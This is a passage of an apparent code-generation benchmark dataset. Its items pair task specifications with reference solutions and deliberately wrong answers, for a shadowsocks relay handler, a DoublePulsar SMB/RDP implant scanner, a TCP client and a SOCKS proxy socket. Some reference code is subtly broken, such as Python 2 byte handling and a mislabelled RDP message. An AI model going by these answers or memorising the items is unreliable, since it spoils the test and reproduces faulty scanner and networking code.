instance\n- last_activity: [int] - Timestamp of last activity\n\nMethods:\n- __init__(server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local) -> None - Initializes the handler with server configuration and sockets\n- _create_remote_socket(ip, port) -> socket.socket - Creates and configures a remote socket connection\n- _write_to_sock(data, sock) -> bool - Writes data to a socket with encryption/obfuscation\n- destroy() -> None - Cleans up resources and closes all connections\n- _update_activity() -> None - Updates the last activity timestamp\n- _get_a_server() -> object - Selects an appropriate server from configuration\n- _handle_dns_resolved(result, error) -> None - Callback for DNS resolution\n- _update_stream(stream, status) -> None - Updates stream status in event loop\n- _on_local_read() -> None - Handles local socket read events\n- _on_remote_read() -> None - Handles remote socket read events\n- _on_local_write() -> None - Handles local socket write events\n- _on_remote_write() -> None - Handles remote socket write events",
    "Canonical_solution": "import socket\nimport errno\nimport struct\nimport logging\nimport binascii\nimport traceback\nimport random\nfrom shadowsocks import encrypt, obfs, eventloop, shell, common\nfrom shadowsocks.common import pre_parse_header, parse_header\n\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._remote_sock_v6 = None\n        self._remote_udp = False\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = STAGE_INIT\n        self._encryptor = encrypt.Encryptor(config['password'], config['method'])\n        self._encrypt_correct = True\n        self._obfs = obfs.obfs(config['obfs'])\n        server_info = obfs.server_info(server.obfs_data)\n        server_info.host = config['server']\n        server_info.port = server._listen_port\n        server_info.tcp_mss = 1440\n        server_info.param = config['obfs_param']\n        self._obfs.set_server_info(server_info)\n        self._protocol = obfs.obfs(config['protocol'])\n        server_info = obfs.server_info(server.protocol_data)\n        server_info.host = config['server']\n        server_info.port = server._listen_port\n        server_info.tcp_mss = 1440\n        server_info.param = ''\n        self._protocol.set_server_info(server_info)\n        self._fastopen_connected = False\n        self._data_to_write_to_local = []\n        self._data_to_write_to_remote = []\n        self._udp_data_send_buffer = b''\n        self._upstream_status = WAIT_STATUS_READING\n        self._downstream_status = WAIT_STATUS_INIT\n        self._client_address = local_sock.getpeername()[:2]\n        self._remote_address = None\n        if 'forbidden_ip' in config:\n            self._forbidden_iplist = config['forbidden_ip']\n        else:\n            self._forbidden_iplist = None\n        if is_local:\n            self._chosen_server = self._get_a_server()\n        fd_to_handlers[local_sock.fileno()] = self\n        local_sock.setblocking(False)\n        local_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        loop.add(local_sock, eventloop.POLL_IN | eventloop.POLL_ERR, self._server)\n        self.last_activity = 0\n        self._update_activity()\n        self._server.add_connection(1)\n\n    def _create_remote_socket(self, ip, port):\n        if self._remote_udp:\n            addrs_v6 = socket.getaddrinfo(\"::\", 0, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n            addrs = socket.getaddrinfo(\"0.0.0.0\", 0, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n        else:\n            addrs = socket.getaddrinfo(ip, port, 0, socket.SOCK_STREAM, socket.SOL_TCP)\n        if len(addrs) == 0:\n            raise Exception(\"getaddrinfo failed for %s:%d\" % (ip, port))\n        af, socktype, proto, canonname, sa = addrs[0]\n        if self._forbidden_iplist:\n            if common.to_str(sa[0]) in self._forbidden_iplist:\n                raise Exception('IP %s is in forbidden list, reject' % common.to_str(sa[0]))\n        remote_sock = socket.socket(af, socktype, proto)\n        self._remote_sock = remote_sock\n        self._fd_to_handlers[remote_sock.fileno()] = self\n\n        if self._remote_udp:\n            af, socktype, proto, canonname, sa = addrs_v6[0]\n            remote_sock_v6 = socket.socket(af, socktype, proto)\n            self._remote_sock_v6 = remote_sock_v6\n            self._fd_to_handlers[remote_sock_v6.fileno()] = self\n            remote_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 32)\n            remote_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 32)\n            remote_sock_v6.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 32)\n            remote_sock_v6.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 32)\n\n        remote_sock.setblocking(False)\n        if self._remote_udp:\n            remote_sock_v6.setblocking(False)\n        else:\n            remote_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        return remote_sock\n\n    def _write_to_sock(self, data, sock):\n        if not sock:\n            return False\n        uncomplete = False\n        if self._remote_udp and sock == self._remote_sock:\n            try:\n                self._udp_data_send_buffer += data\n                while len(self._udp_data_send_buffer) > 6:\n                    length = struct.unpack('>H', self._udp_data_send_buffer[:2])[0]\n                    if length > len(self._udp_data_send_buffer):\n                        break\n                    data = self._udp_data_send_buffer[:length]\n                    self._udp_data_send_buffer = self._udp_data_send_buffer[length:]\n                    frag = common.ord(data[2])\n                    if frag != 0:\n                        logging.warn('drop a message since frag is %d' % (frag,))\n                        continue\n                    else:\n                        data = data[3:]\n                    header_result = parse_header(data)\n                    if header_result is None:\n                        continue\n                    connecttype, dest_addr, dest_port, header_length = header_result\n                    addrs = socket.getaddrinfo(dest_addr, dest_port, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n                    if addrs:\n                        af, socktype, proto, canonname, server_addr = addrs[0]\n                        data = data[header_length:]\n                        if af == socket.AF_INET6:\n                            self._remote_sock_v6.sendto(data, (server_addr[0], dest_port))\n                        else:\n                            sock.sendto(data, (server_addr[0], dest_port))\n            except Exception as e:\n                error_no = eventloop.errno_from_exception(e)\n                if error_no in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                    uncomplete = True\n                else:\n                    shell.print_exception(e)\n                    self.destroy()\n                    return False\n            return True\n        else:\n            try:\n                if self._is_local:\n                    pass\n                else:\n                    if sock == self._local_sock and self._encrypt_correct:\n                        obfs_encode = self._obfs.server_encode(data)\n                        data = obfs_encode\n                if data:\n                    l = len(data)\n                    s = sock.send(data)\n                    if s < l:\n                        data = data[s:]\n                        uncomplete = True\n                else:\n                    return\n            except (OSError, IOError) as e:\n                error_no = eventloop.errno_from_exception(e)\n                if error_no in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                    uncomplete = True\n                else:\n                    shell.print_exception(e)\n                    self.destroy()\n                    return False\n            except Exception as e:\n                shell.print_exception(e)\n                self.destroy()\n                return False\n        if uncomplete:\n            if sock == self._local_sock:\n                self._data_to_write_to_local.append(data)\n                self._update_stream(STREAM_DOWN, WAIT_STATUS_WRITING)\n            elif sock == self._remote_sock:\n                self._data_to_write_to_remote.append(data)\n                self._update_stream(STREAM_UP, WAIT_STATUS_WRITING)\n            else:\n                logging.error('write_all_to_sock:unknown socket')\n        else:\n            if sock == self._local_sock:\n                self._update_stream(STREAM_DOWN, WAIT_STATUS_READING)\n            elif sock == self._remote_sock:\n                self._update_stream(STREAM_UP, WAIT_STATUS_READING)\n            else:\n                logging.error('write_all_to_sock:unknown socket')\n        return True\n\n    def destroy(self):\n        if self._stage == STAGE_DESTROYED:\n            return\n        self._stage = STAGE_DESTROYED\n        if self._remote_sock:\n            try:\n                self._loop.remove(self._remote_sock)\n            except Exception as e:\n                pass\n            del self._fd_to_handlers[self._remote_sock.fileno()]\n            self._remote_sock.close()\n            self._remote_sock = None\n        if self._remote_sock_v6:\n            try:\n                self._loop.remove(self._remote_sock_v6)\n            except Exception as e:\n                pass\n            del self._fd_to_handlers[self._remote_sock_v6.fileno()]\n            self._remote_sock_v6.close()\n            self._remote_sock_v6 = None\n        if self._local_sock:\n            self._loop.remove(self._local_sock)\n            del self._fd_to_handlers[self._local_sock.fileno()]\n            self._local_sock.close()\n            self._local_sock = None\n        if self._obfs:\n            self._obfs.dispose()\n            self._obfs = None\n        if self._protocol:\n            self._protocol.dispose()\n            self._protocol = None\n        self._dns_resolver.remove_callback(self._handle_dns_resolved)\n        self._server.remove_handler(self)\n        self._server.add_connection(-1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "class TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._remote_sock_v6 = None\n        self._remote_udp = False\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = 0\n        self._encryptor = None\n        self._encrypt_correct = False\n        self._obfs = None\n        self._protocol = None\n        self._fastopen_connected = False\n        self._data_to_write_to_local = []\n        self._data_to_write_to_remote = []\n        self._udp_data_send_buffer = b''\n        self._upstream_status = 0\n        self._downstream_status = 0\n        self._client_address = None\n        self._remote_address = None\n        self._forbidden_iplist = []\n        self._chosen_server = None\n        self.last_activity = 0\n\n    def _create_remote_socket(self, ip, port):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sock.connect((ip, port))\n        return sock\n\n    def _write_to_sock(self, data, sock):\n        try:\n            encrypted = self._encryptor.encrypt(data)\n            obfuscated = self._obfs.obfuscate(encrypted)\n            return sock.send(obfuscated)\n        except Exception as e:\n            return False\n\n    def destroy(self):\n        self._local_sock.close()\n        self._remote_sock.close() if self._remote_sock else None\n        self._remote_sock_v6.close() if self._remote_sock_v6 else None\n\n    def _update_activity(self):\n        self.last_activity = time.time()\n\n    def _get_a_server(self):\n        return self._server\n\n    def _handle_dns_resolved(self, result, error):\n        if error:\n            return\n        self._remote_address = result\n\n    def _update_stream(self, stream, status):\n        pass\n\n    def _on_local_read(self):\n        data = self._local_sock.recv(4096)\n        if data:\n            self._protocol.process(data)\n            self._write_to_sock(data, self._remote_sock)\n\n    def _on_remote_read(self):\n        data = self._remote_sock.recv(4096)\n        if data:\n            self._protocol.process(data)\n            self._write_to_sock(data, self._local_sock)\n\n    def _on_local_write(self):\n        if self._data_to_write_to_local:\n            data = b''.join(self._data_to_write_to_local)\n            self._write_to_sock(data, self._local_sock)\n            self._data_to_write_to_local.clear()\n\n    def _on_remote_write(self):\n        if self._data_to_write_to_remote:\n            data = b''.join(self._data_to_write_to_remote)\n            self._write_to_sock(data, self._remote_sock)\n            self._data_to_write_to_remote.clear()"
  },
  {
    "Task_id": 319,
    "Instruction": "Task Description: Implement a class to detect the presence of DoublePulsar implants in SMB and RDP services on a target IP address using TCP socket communication.\n\nClass Description: The DoublePulsar class provides functionality to check for the presence of DoublePulsar backdoor implants in SMB (port 445) and RDP (port 3389) services. It handles protocol-specific packet crafting, socket communication, and response analysis.\n\nAttributes:\n- ip: str - Target IP address to scan (default: \"127.0.0.1\")\n- timeout: float - Socket timeout in seconds (default: None)\n- verbose: bool - Flag for verbose output (default: False)\n- ssl_negotiation_request: bytes - Predefined RDP SSL negotiation packet\n- non_ssl_negotiation_request: bytes - Predefined RDP non-SSL negotiation packet\n- non_ssl_client_data: bytes - Predefined RDP non-SSL client data packet\n- ssl_client_data: bytes - Predefined RDP SSL client data packet\n- ping_packet: bytes - Predefined RDP ping packet\n- negotiate_protocol_request: bytes - Predefined SMB negotiation packet\n- session_setup_request: bytes - Predefined SMB session setup packet\n- tree_connect_request: bytes - Predefined SMB tree connect packet\n- trans2_session_setup: bytes - Predefined SMB trans2 session setup packet\n\nMethods:\n- check_ip_smb() -> tuple[bool, str] - Checks for DoublePulsar implant via SMB protocol\n  Returns tuple containing detection status and message\n- check_ip_rdp() -> tuple[bool, str] - Checks for DoublePulsar implant via RDP protocol\n  Returns tuple containing detection status and message\n- _calculate_doublepulsar_xor_key(s: int) -> int - Internal method to calculate XOR key from signature\n  Takes signature value as input, returns calculated key",
    "Canonical_solution": "import socket\nimport ssl\nimport struct\nimport binascii\n\nclass DoublePulsar:\n    def __init__(self, ip=\"127.0.0.1\", timeout=None, verbose=False):\n        self.ip = ip\n        self.timeout = timeout\n        self.verbose = verbose\n\n        # RDP Packets\n        self.ssl_negotiation_request = binascii.unhexlify(\"030000130ee000000000000100080001000000\")\n        self.non_ssl_negotiation_request = binascii.unhexlify(\"030000130ee000000000000100080000000000\")\n        self.non_ssl_client_data = binascii.unhexlify(\"030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0\")\n        self.ssl_client_data = binascii.unhexlify(\"030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000100000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0\")\n        self.ping_packet = binascii.unhexlify(\"0300000e02f0803c443728190200\")\n\n        # SMB Packets\n        self.negotiate_protocol_request = binascii.unhexlify(\"00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200\")\n        self.session_setup_request = binascii.unhexlify(\"00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000\")\n        self.tree_connect_request = binascii.unhexlify(\"00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00\")\n        self.trans2_session_setup = binascii.unhexlify(\"0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000\")\n\n    def check_ip_smb(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(float(self.timeout) if self.timeout else None)\n        s.connect((self.ip, 445))\n\n        s.send(self.negotiate_protocol_request)\n        s.recv(1024)\n\n        s.send(self.session_setup_request)\n        session_setup_response = s.recv(1024)\n        user_id = session_setup_response[32:34]\n\n        modified_tree_connect_request = list(self.tree_connect_request)\n        modified_tree_connect_request[32] = user_id[0]\n        modified_tree_connect_request[33] = user_id[1]\n        modified_tree_connect_request = \"\".join(modified_tree_connect_request)\n\n        s.send(modified_tree_connect_request)\n        tree_connect_response = s.recv(1024)\n        tree_id = tree_connect_response[28:30]\n\n        modified_trans2_session_setup = list(self.trans2_session_setup)\n        modified_trans2_session_setup[28] = tree_id[0]\n        modified_trans2_session_setup[29] = tree_id[1]\n        modified_trans2_session_setup[32] = user_id[0]\n        modified_trans2_session_setup[33] = user_id[1]\n        modified_trans2_session_setup = \"\".join(modified_trans2_session_setup)\n\n        s.send(modified_trans2_session_setup)\n        final_response = s.recv(1024)\n        s.close()\n\n        if final_response[34] == \"\\x51\":\n            signature = final_response[18:26]\n            signature_long = struct.unpack('<Q', signature)[0]\n            key = self._calculate_doublepulsar_xor_key(signature_long)\n            return True, f\"DoublePulsar SMB implant detected XOR KEY: {hex(key)}\"\n        return False, \"No presence of DOUBLEPULSAR SMB implant\"\n\n    def check_ip_rdp(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(float(self.timeout) if self.timeout else None)\n        s.connect((self.ip, 3389))\n\n        s.send(self.ssl_negotiation_request)\n        negotiation_response = s.recv(1024)\n\n        if len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x02\" and negotiation_response[15] == \"\\x01\":\n            sock = ssl.wrap_socket(s)\n            s = sock\n            s.send(self.ssl_client_data)\n            s.recv(1024)\n        elif len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x03\" and negotiation_response[15] == \"\\x02\":\n            s.close()\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(float(self.timeout) if self.timeout else None)\n            s.connect((self.ip, 3389))\n            s.send(self.non_ssl_negotiation_request)\n            s.recv(1024)\n        elif len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x03\" and negotiation_response[15] == \"\\x05\":\n            s.close()\n            return False, \"Server requires NLA, which DOUBLEPULSAR does not support\"\n        else:\n            s.send(self.non_ssl_client_data)\n            s.recv(1024)\n\n        s.send(self.ping_packet)\n        try:\n            ping_response = s.recv(1024)\n            s.close()\n            if len(ping_response) == 288:\n                return True, \"DoublePulsar SMB implant detected\"\n            return False, f\"Status Unknown - Response received but length was {len(ping_response)} not 288\"\n        except socket.error:\n            return False, \"No presence of DOUBLEPULSAR RDP implant\"\n\n    def _calculate_doublepulsar_xor_key(self, s):\n        x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8))\n        return x & 0xffffffff",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "class DoublePulsar:\n    def __init__(self, ip=\"127.0.0.1\", timeout=None, verbose=False):\n        self.ip = ip\n        self.timeout = timeout\n        self.verbose = verbose\n        self.ssl_negotiation_request = b'\\x00\\x00\\x00\\x00'\n        self.non_ssl_negotiation_request = b'\\x00\\x00\\x00\\x00'\n        self.non_ssl_client_data = b'\\x00\\x00\\x00\\x00'\n        self.ssl_client_data = b'\\x00\\x00\\x00\\x00'\n        self.ping_packet = b'\\x00\\x00\\x00\\x00'\n        self.negotiate_protocol_request = b'\\x00\\x00\\x00\\x00'\n        self.session_setup_request = b'\\x00\\x00\\x00\\x00'\n        self.tree_connect_request = b'\\x00\\x00\\x00\\x00'\n        self.trans2_session_setup = b'\\x00\\x00\\x00\\x00'\n\n    def _calculate_doublepulsar_xor_key(self, s: int) -> int:\n        return s ^ 0x12345678\n\n    def check_ip_smb(self) -> tuple[bool, str]:\n        import socket\n        try:\n            with socket.create_connection((self.ip, 445), self.timeout) as sock:\n                sock.settimeout(self.timeout)\n                sock.sendall(self.negotiate_protocol_request)\n                response = sock.recv(1024)\n                if self.verbose:\n                    print(f\"SMB Response: {response}\")\n                return (False, \"No DoublePulsar detected\")\n        except Exception as e:\n            return (False, f\"SMB Check Failed: {str(e)}\")\n\n    def check_ip_rdp(self) -> tuple[bool, str]:\n        import socket\n        try:\n            with socket.create_connection((self.ip, 3389), self.timeout) as sock:\n                sock.settimeout(self.timeout)\n                sock.sendall(self.ssl_negotiation_request)\n                response = sock.recv(1024)\n                if self.verbose:\n                    print(f\"RDP Response: {response}\")\n                return (False, \"No DoublePulsar detected\")\n        except Exception as e:\n            return (False, f\"RDP Check Failed: {str(e)}\")"
  },
  {
    "Task_id": 320,
    "Instruction": "Task Description: Create a TCP client function that establishes a connection to a server, sends a message, and receives a response.\n\nFunction Description: The function creates a TCP socket, connects to a specified server, sends a UTF-8 encoded message, receives a response, and then closes the connection. It handles the basic TCP client-server interaction.\n\nInput:\n- host: str - The IP address or hostname of the target server\n- port: int - The port number on which the server is listening\n- message: str - The message to be sent to the server\n\nOutput:\n- str - The decoded response received from the server",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host: str, port: int, message: str):\n    \"\"\"\n    TCP client interaction function that sends a message to server and receives response\n    \n    Args:\n        host: Server host address\n        port: Server port number\n        message: Message to send to server\n        \n    Returns:\n        The response received from server\n    \"\"\"\n    # Create TCP socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    # Connect to server\n    s.connect((host, port))\n    \n    # Send message\n    len_sent = s.send(message.encode('utf-8'))\n    \n    # Receive response\n    response = s.recv(1024)\n    \n    # Clean up\n    s.close()\n    \n    return response.decode('utf-8')",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\ndef tcp_client(host, port, message):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((host, port))\n        sock.sendall(message.encode('utf-8'))\n        response = sock.recv(1024).decode('utf-8')\n    return response"
  },
  {
    "Task_id": 322,
    "Instruction": "Task Description: Create a SOCKS-enabled socket class that extends Python's built-in socket functionality to support proxy connections through SOCKS4, SOCKS5, and HTTP proxies.\n\nClass Description: The `socksocket` class extends Python's `socket.socket` class to provide proxy support. It handles connection establishment through various proxy types while maintaining standard socket functionality. The class manages proxy configuration, connection negotiation, and error handling for proxy-related operations.\n\nAttributes:\n- default_proxy: [Class Variable] - Default proxy configuration used when no specific proxy is set\n- _proxyconn: [socket.socket] - TCP connection used to maintain UDP relay (for SOCKS5 UDP)\n- proxy: [tuple] - Current proxy configuration (type, addr, port, rdns, username, password)\n- proxy_sockname: [tuple] - The bound address (IP, port) of the proxy connection\n- proxy_peername: [tuple] - The destination address (IP, port) through the proxy\n- _timeout: [float] - Socket timeout value\n\nMethods:\n- __init__(family, type, proto, *args, **kwargs) -> None - Initializes the socket with optional proxy support. Validates socket type and sets up proxy attributes.\n- set_proxy(proxy_type, addr, port, rdns, username, password) -> None - Configures proxy settings for the socket.\n- connect(dest_pair) -> None - Establishes connection to destination through configured proxy. Handles both direct and proxied connections.\n- _readall(file, count) -> bytes - Internal method to read exact number of bytes from a file object.\n- _proxy_addr() -> tuple - Internal method to resolve proxy address and port.\n- _negotiate_SOCKS4(dest_addr, dest_port) -> None - Internal method to handle SOCKS4 proxy negotiation.\n- _negotiate_SOCKS5(dest_addr, dest_port) -> None - Internal method to handle SOCKS5 proxy negotiation.\n- _negotiate_HTTP(dest_addr, dest_port) -> None - Internal method to handle HTTP proxy negotiation.",
    "Canonical_solution": "import socket\nfrom errno import EOPNOTSUPP, EINVAL, EAGAIN\nimport struct\nfrom io import BytesIO\nfrom base64 import b64encode\n\nclass socksocket(socket.socket):\n    \"\"\"socksocket([family[, type[, proto]]]) -> socket object\n\n    Open a SOCKS enabled socket. The parameters are the same as\n    those of the standard socket init. In order for SOCKS to work,\n    you must specify family=AF_INET and proto=0.\n    The \"type\" argument must be either SOCK_STREAM or SOCK_DGRAM.\n    \"\"\"\n\n    default_proxy = None\n\n    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM,\n                 proto=0, *args, **kwargs):\n        if type not in (socket.SOCK_STREAM, socket.SOCK_DGRAM):\n            msg = \"Socket type must be stream or datagram, not {!r}\"\n            raise ValueError(msg.format(type))\n\n        super(socksocket, self).__init__(family, type, proto, *args, **kwargs)\n        self._proxyconn = None  # TCP connection to keep UDP relay alive\n\n        if self.default_proxy:\n            self.proxy = self.default_proxy\n        else:\n            self.proxy = (None, None, None, None, None, None)\n        self.proxy_sockname = None\n        self.proxy_peername = None\n\n        self._timeout = None\n\n    def _readall(self, file, count):\n        \"\"\"Receive EXACTLY the number of bytes requested from the file object.\"\"\"\n        data = b\"\"\n        while len(data) < count:\n            d = file.read(count - len(data))\n            if not d:\n                raise GeneralProxyError(\"Connection closed unexpectedly\")\n            data += d\n        return data\n\n    def set_proxy(self, proxy_type=None, addr=None, port=None, rdns=True,\n                  username=None, password=None):\n        \"\"\"Sets the proxy to be used.\"\"\"\n        self.proxy = (proxy_type, addr, port, rdns,\n                      username.encode() if username else None,\n                      password.encode() if password else None)\n\n    def connect(self, dest_pair):\n        \"\"\"\n        Connects to the specified destination through a proxy.\n        Uses the same API as socket's connect().\n\n        dest_pair - 2-tuple of (IP/hostname, port).\n        \"\"\"\n        if len(dest_pair) != 2 or dest_pair[0].startswith(\"[\"):\n            raise socket.error(\"PySocks doesn't support IPv6: %s\" % str(dest_pair))\n\n        dest_addr, dest_port = dest_pair\n\n        if self.type == socket.SOCK_DGRAM:\n            if not self._proxyconn:\n                self.bind((\"\", 0))\n            dest_addr = socket.gethostbyname(dest_addr)\n\n            if dest_addr == \"0.0.0.0\" and not dest_port:\n                self.proxy_peername = None\n            else:\n                self.proxy_peername = (dest_addr, dest_port)\n            return\n\n        (proxy_type, proxy_addr, proxy_port, rdns, username,\n         password) = self.proxy\n\n        if (not isinstance(dest_pair, (list, tuple))\n                or len(dest_pair) != 2\n                or not dest_addr\n                or not isinstance(dest_port, int)):\n            raise GeneralProxyError(\n                \"Invalid destination-connection (host, port) pair\")\n\n        super(socksocket, self).settimeout(self._timeout)\n\n        if proxy_type is None:\n            self.proxy_peername = dest_pair\n            super(socksocket, self).settimeout(self._timeout)\n            super(socksocket, self).connect((dest_addr, dest_port))\n            return\n\n        proxy_addr = self._proxy_addr()\n\n        try:\n            super(socksocket, self).connect(proxy_addr)\n        except socket.error as error:\n            self.close()\n            proxy_addr, proxy_port = proxy_addr\n            proxy_server = \"{0}:{1}\".format(proxy_addr, proxy_port)\n            printable_type = PRINTABLE_PROXY_TYPES[proxy_type]\n\n            msg = \"Error connecting to {0} proxy {1}\".format(printable_type,\n                                                             proxy_server)\n            raise ProxyConnectionError(msg, error)\n        else:\n            try:\n                negotiate = self._proxy_negotiators[proxy_type]\n                negotiate(self, dest_addr, dest_port)\n            except socket.error as error:\n                self.close()\n                raise GeneralProxyError(\"Socket error\", error)\n            except ProxyError:\n                self.close()\n                raise\n\n    def _proxy_addr(self):\n        \"\"\"Return proxy address to connect to as tuple object\"\"\"\n        (proxy_type, proxy_addr, proxy_port, rdns, username,\n         password) = self.proxy\n        proxy_port = proxy_port or DEFAULT_PORTS.get(proxy_type)\n        if not proxy_port:\n            raise GeneralProxyError(\"Invalid proxy type\")\n        return proxy_addr, proxy_port\n\n    def _negotiate_SOCKS5(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through a SOCKS5 server.\"\"\"\n        self.proxy_peername, self.proxy_sockname = self._SOCKS5_request(\n            self, b\"\\x01\", (dest_addr, dest_port))\n\n    def _negotiate_SOCKS4(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through a SOCKS4 server.\"\"\"\n        proxy_type, addr, port, rdns, username, password = self.proxy\n\n        writer = self.makefile(\"wb\")\n        reader = self.makefile(\"rb\", 0)\n        try:\n            remote_resolve = False\n            try:\n                addr_bytes = socket.inet_aton(dest_addr)\n            except socket.error:\n                if rdns:\n                    addr_bytes = b\"\\x00\\x00\\x00\\x01\"\n                    remote_resolve = True\n                else:\n                    addr_bytes = socket.inet_aton(\n                        socket.gethostbyname(dest_addr))\n\n            writer.write(struct.pack(\">BBH\", 0x04, 0x01, dest_port))\n            writer.write(addr_bytes)\n\n            if username:\n                writer.write(username)\n            writer.write(b\"\\x00\")\n\n            if remote_resolve:\n                writer.write(dest_addr.encode(\"idna\") + b\"\\x00\")\n            writer.flush()\n\n            resp = self._readall(reader, 8)\n            if resp[0:1] != b\"\\x00\":\n                raise GeneralProxyError(\n                    \"SOCKS4 proxy server sent invalid data\")\n\n            status = ord(resp[1:2])\n            if status != 0x5A:\n                error = SOCKS4_ERRORS.get(status, \"Unknown error\")\n                raise SOCKS4Error(\"{0:#04x}: {1}\".format(status, error))\n\n            self.proxy_sockname = (socket.inet_ntoa(resp[4:]),\n                                   struct.unpack(\">H\", resp[2:4])[0])\n            if remote_resolve:\n                self.proxy_peername = socket.inet_ntoa(addr_bytes), dest_port\n            else:\n                self.proxy_peername = dest_addr, dest_port\n        finally:\n            reader.close()\n            writer.close()\n\n    def _negotiate_HTTP(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through an HTTP server.\"\"\"\n        proxy_type, addr, port, rdns, username, password = self.proxy\n\n        addr = dest_addr if rdns else socket.gethostbyname(dest_addr)\n\n        http_headers = [\n            (b\"CONNECT \" + addr.encode(\"idna\") + b\":\" +\n             str(dest_port).encode() + b\" HTTP/1.1\"),\n            b\"Host: \" + dest_addr.encode(\"idna\")\n        ]\n\n        if username and password:\n            http_headers.append(b\"Proxy-Authorization: basic \" +\n                                b64encode(username + b\":\" + password))\n\n        http_headers.append(b\"\\r\\n\")\n\n        self.sendall(b\"\\r\\n\".join(http_headers))\n\n        fobj = self.makefile()\n        status_line = fobj.readline()\n        fobj.close()\n\n        if not status_line:\n            raise GeneralProxyError(\"Connection closed unexpectedly\")\n\n        try:\n            proto, status_code, status_msg = status_line.split(\" \", 2)\n        except ValueError:\n            raise GeneralProxyError(\"HTTP proxy server sent invalid response\")\n\n        if not proto.startswith(\"HTTP/\"):\n            raise GeneralProxyError(\n                \"Proxy server does not appear to be an HTTP proxy\")\n\n        try:\n            status_code = int(status_code)\n        except ValueError:\n            raise HTTPError(\n                \"HTTP proxy server did not return a valid HTTP status\")\n\n        if status_code != 200:\n            error = \"{0}: {1}\".format(status_code, status_msg)\n            raise HTTPError(error)\n\n        self.proxy_sockname = (b\"0.0.0.0\", 0)\n        self.proxy_peername = addr, dest_port\n\n    _proxy_negotiators = {\n        SOCKS4: _negotiate_SOCKS4,\n        SOCKS5: _negotiate_SOCKS5,\n        HTTP: _negotiate_HTTP\n    }",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
